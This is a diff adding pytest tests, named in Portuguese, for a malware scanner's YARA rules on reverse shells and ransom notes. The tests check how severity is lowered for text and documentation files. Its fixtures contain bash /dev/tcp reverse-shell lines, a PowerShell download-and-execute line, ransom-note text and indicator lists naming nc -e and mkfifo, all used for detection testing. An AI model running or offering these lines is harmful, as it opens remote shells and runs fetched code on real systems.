@@ -313,3 +313,113 @@ def test_procmon_le_conexoes_no_psutil_antigo():
         connections = staticmethod(lambda kind: [Conn(Addr("203.0.113.9", 4444))])
 
     assert describe(OldProc())["remote_conns"] == ["203.0.113.9:4444"]
+
+
+# ------------------------------------------- falsos positivos em texto/documentacao
+SHELL_REVERSO = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
+
+MD_AGENTE_PENTEST = (
+    "# Agente de pentest\n\nExemplo de shell reverso para o relatorio:\n\n"
+    "```bash\nbash -i >& /dev/tcp/attacker/4444 0>&1\n```\n\n"
+    "```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n```\n"
+)
+
+
+def _linha_jsonl(texto):
+    import json
+    return json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": texto}]}})
+
+
+def test_shell_reverso_em_script_continua_critical(tmp_path, scanner):
+    f = tmp_path / "rev.sh"
+    f.write_text("#!/bin/bash\n" + SHELL_REVERSO)
+    got = [a for a in scanner.scan_file(f) if a.rule == "yara.Reverse_Shell_Patterns"]
+    assert got and got[0].severity == Severity.CRITICAL
+
+
+@pytest.mark.parametrize("linha", [
+    "exec 5<>/dev/tcp/10.0.0.1/80\n",
+    "cat < /dev/tcp/10.0.0.1/80 | sh\n",
+    "sh -i &> /dev/tcp/10.0.0.1/80 0>&1\n",
+])
+def test_dev_tcp_com_redirecionamento_de_shell_dispara(tmp_path, scanner, linha):
+    f = tmp_path / "x.sh"
+    f.write_text(linha)
+    assert "yara.Reverse_Shell_Patterns" in rules_of(scanner.scan_file(f))
+
+
+@pytest.mark.parametrize("texto", [
+    "- Corrigido: caminhos /dev/tcp/ no sandbox agora sao bloqueados\n",
+    'SHELL_REVERSO = (b"/dev/tcp/", b"nc -e", b"mkfifo")\n',
+])
+def test_dev_tcp_sem_contexto_de_shell_nao_dispara(tmp_path, scanner, texto):
+    f = tmp_path / "x.py"
+    f.write_text(texto)
+    assert "yara.Reverse_Shell_Patterns" not in rules_of(scanner.scan_file(f))
+
+
+def test_ransom_com_palavras_soltas_nao_dispara(tmp_path, scanner):
+    # como em src/mandacaru/ml/features.py: frase + palavras listadas como indicadores
+    f = tmp_path / "features.py"
+    f.write_text('"resgate": (b"your files have been encrypted", b".onion", b"bitcoin", b"decrypt"),\n')
+    assert "yara.Ransom_Note_Keywords" not in rules_of(scanner.scan_file(f))
+
+
+@pytest.mark.parametrize("nota", [
+    "YOUR FILES HAVE BEEN ENCRYPTED! To decrypt your files, visit our page.",
+    "Seus arquivos foram criptografados. Acesse lockbit3abcdefghijklmnop.onion",
+])
+def test_ransom_com_frase_de_nota_dispara(tmp_path, scanner, nota):
+    f = tmp_path / "LEIA.txt"
+    f.write_text(nota)
+    assert "yara.Ransom_Note_Keywords" in rules_of(scanner.scan_file(f))
+
+
+def test_nota_de_resgate_em_txt_mantem_high(tmp_path, scanner):
+    f = tmp_path / "LEIA.txt"
+    f.write_text("Seus arquivos foram criptografados. Pague em bitcoin para decrypt.")
+    got = [a for a in scanner.scan_file(f) if a.rule == "yara.Ransom_Note_Keywords"]
+    assert got and got[0].severity == Severity.HIGH
+
+
+def test_md_com_shell_reverso_em_bloco_de_codigo_nao_passa_de_medium(tmp_path, scanner):
+    f = tmp_path / "pentest-agent.md"
+    f.write_text(MD_AGENTE_PENTEST)
+    alerts = scanner.scan_file(f)
+    rev = [a for a in alerts if a.rule == "yara.Reverse_Shell_Patterns"]
+    assert rev, "rebaixar, nao descartar"
+    assert rev[0].evidence["severidade_original"] == "CRITICAL"
+    assert max(a.severity for a in alerts) <= Severity.MEDIUM
+
+
+def test_jsonl_de_transcricao_nao_passa_de_medium(tmp_path, scanner):
+    f = tmp_path / "sessao.jsonl"
+    f.write_text("\n".join([
+        _linha_jsonl("Exemplo: " + SHELL_REVERSO),
+        _linha_jsonl("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"),
+        _linha_jsonl("Your files have been encrypted. Send bitcoin."),
+    ]) + "\n")
+    alerts = scanner.scan_file(f)
+    assert {"yara.Reverse_Shell_Patterns", "yara.Ransom_Note_Keywords"} <= rules_of(alerts)
+    assert max(a.severity for a in alerts) <= Severity.MEDIUM
+
+
+@pytest.mark.parametrize("ext", [".txt", ".log", ".rst", ".markdown"])
+def test_tecnica_em_texto_e_log_e_rebaixada(tmp_path, scanner, ext):
+    f = tmp_path / f"notas{ext}"
+    f.write_text(SHELL_REVERSO)
+    rev = [a for a in scanner.scan_file(f) if a.rule == "yara.Reverse_Shell_Patterns"]
+    assert rev and rev[0].severity == Severity.MEDIUM
+
+
+def test_regra_de_familia_nao_e_rebaixada_em_texto(tmp_path):
+    regras = tmp_path / "regras"
+    regras.mkdir()
+    (regras / "familia.yar").write_text(
+        'rule Familia_X { meta: severity = "CRITICAL" category = "family"\n'
+        '  strings: $s = "FAMILIA-X-MARCADOR" condition: $s }\n')
+    f = tmp_path / "achado.md"
+    f.write_text("FAMILIA-X-MARCADOR\n")
+    got = [a for a in StaticScanner(extra_rule_dirs=[str(regras)]).scan_file(f)
+           if a.rule == "yara.Familia_X"]
+    assert got and got[0].severity == Severity.CRITICAL
